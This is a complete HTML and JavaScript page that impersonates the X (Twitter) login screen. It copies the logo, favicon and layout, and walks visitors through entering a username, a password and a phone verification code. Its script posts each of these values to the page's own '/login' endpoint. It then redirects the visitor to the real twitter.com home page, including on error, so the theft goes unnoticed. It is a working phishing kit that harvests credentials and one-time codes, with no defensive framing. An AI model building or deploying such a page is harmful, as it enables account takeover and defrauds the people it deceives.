<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to X / X</title>
    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #242d34; /* Dark overlay background */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }
        .modal {
            background-color: #000;
            width: 600px;
            height: 650px;
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 80px;
            box-sizing: border-box;
            position: relative;
        }
        .logo {
            margin-top: 20px;
            width: 30px;
            fill: #fff;
        }
        h1 {
            font-size: 31px;
            font-weight: 700;
            margin: 30px 0 30px;
            align-self: flex-start;
            width: 100%;
            text-align: center; 
        }
        .btn-social {
            width: 300px;
            height: 40px;
            border-radius: 20px;
            background-color: #fff;
            color: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 15px;
            margin-bottom: 25px;
            cursor: pointer;
            border: 1px solid #fff;
        }
        .btn-social:hover {
            background-color: #e6e6e6;
        }
        .divider {
            display: flex;
            align-items: center;
            width: 300px;
            margin: 0 0 20px;
            color: #fff;
            font-size: 15px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #333;
        }
        .divider span {
            padding: 0 10px;
        }
        .input-group {
            width: 300px;
            position: relative;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            height: 56px;
            background-color: #000;
            border: 1px solid #333;
            border-radius: 4px;
            color: #fff;
            padding: 20px 10px 0; /* Padding for label */
            font-size: 17px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border-color: #1d9bf0;
        }
        .floating-label {
            position: absolute;
            left: 10px;
            top: 18px;
            color: #71767b;
            font-size: 17px;
            pointer-events: none;
            transition: 0.2s;
        }
        input:focus ~ .floating-label,
        input:not(:placeholder-shown) ~ .floating-label {
            top: 6px;
            font-size: 13px;
            color: #1d9bf0;
        }
        .btn-next {
            width: 300px;
            height: 36px;
            border-radius: 18px;
            background-color: #fff;
            color: #000;
            font-weight: 700;
            font-size: 15px;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-next:hover {
            background-color: #e6e6e6;
        }
        .btn-black {
            background-color: #000;
            color: #fff;
            border: 1px solid #536471;
        }
        .btn-black:hover {
            background-color: rgba(239, 243, 244, 0.1);
        }
        .footer-link {
            margin-top: 40px;
            color: #71767b;
            font-size: 15px;
        }
        .footer-link a {
            color: #1d9bf0;
            text-decoration: none;
        }
        .hidden {
            display: none;
        }
        .close-btn {
            position: absolute;
            top: 15px;
            left: 15px;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            font-family: monospace;
        }
        
        @media (max-width: 600px) {
            .modal {
                width: 100%;
                height: 100%;
                border-radius: 0;
                padding: 0 20px;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="modal">
        <div class="close-btn">x</div>
        <svg viewBox="0 0 24 24" class="logo"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
        
        <div id="step-1" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <h1>Log in to X</h1>
            
            <div class="btn-social">Log in with Google</div>
            <div class="btn-social">Log in with Apple</div>
            
            <div class="divider"><span>or</span></div>
            
            <div class="input-group">
                <input type="text" id="email-input" placeholder=" " required>
                <span class="floating-label">Phone, email, or username</span>
            </div>
            
            <button class="btn-next" onclick="goToStep2()">Next</button>
            <button class="btn-next btn-black" style="margin-top: 20px;">Forgot password?</button>
            
            <div class="footer-link">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>

        <div id="step-2" class="hidden" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <h1 style="margin-bottom: 10px;">Enter your password</h1>
            
            <div class="input-group" style="background: #202327; border-radius: 4px; padding: 10px; margin-bottom: 30px; width: 300px; box-sizing: border-box;">
                 <span style="color: #71767b; font-size: 13px;">Email</span><br>
                 <span id="user-email-display" style="color: #fff; font-size: 15px;">user@example.com</span>
            </div>
            
            <div class="input-group">
                <input type="password" id="password-input" placeholder=" " required>
                <span class="floating-label">Password</span>
            </div>
            
            <button class="btn-next" onclick="submitLogin()">Log in</button>
            
            <div class="footer-link">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>

        <div id="step-3-otp" class="hidden" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <h1 style="margin-bottom: 10px;">Check your phone</h1>
            <p style="color: #71767b; font-size: 15px; margin-bottom: 20px;">We sent you a verification code.</p>
            
            <div class="input-group">
                <input type="text" id="otp-input" placeholder=" " required style="letter-spacing: 2px;">
                <span class="floating-label">Verification Code</span>
            </div>
            
            <button class="btn-next" onclick="submitOTP()">Verify</button>
        </div>
    </div>

    <script>
        function goToStep2() {
            const email = document.getElementById('email-input').value;
            if (!email) {
                document.getElementById('email-input').focus();
                document.getElementById('email-input').style.borderColor = '#d93025'; // Red if empty
                return;
            }
            document.getElementById('user-email-display').innerText = email;
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
            // Re-apply styles to step-2 if needed (it inherits from inline)
            document.getElementById('step-2').style.display = "flex";
            document.getElementById('password-input').focus();
        }

        function submitLogin() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            
            if (!password) {
                document.getElementById('password-input').focus();
                return;
            }

            // Show loading
            const btn = document.querySelector('#step-2 .btn-next');
            const originalText = btn.innerText;
            btn.innerText = "Verifying...";
            btn.disabled = true;

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === '2fa_required') {
                    // Show OTP Step
                    document.getElementById('step-2').classList.add('hidden');
                    document.getElementById('step-3-otp').classList.remove('hidden');
                    document.getElementById('step-3-otp').style.display = "flex";
                    document.getElementById('otp-input').focus();
                } else {
                    // Success or fallback redirect
                    window.location.href = "https://twitter.com/home";
                }
            })
            .catch(err => {
                // Fallback on error
                window.location.href = "https://twitter.com/home";
            });
        }

        function submitOTP() {
            const otp = document.getElementById('otp-input').value;
            if(!otp) return;
            
            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ otp: otp })
            }).then(() => {
                window.location.href = "https://twitter.com/home";
            });
        }
        
        // Enter key support
        document.getElementById('email-input').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') goToStep2();
        });
        document.getElementById('password-input').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') submitLogin();
        });
        document.getElementById('otp-input').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') submitOTP();
        });
    </script>
</body>
</html>
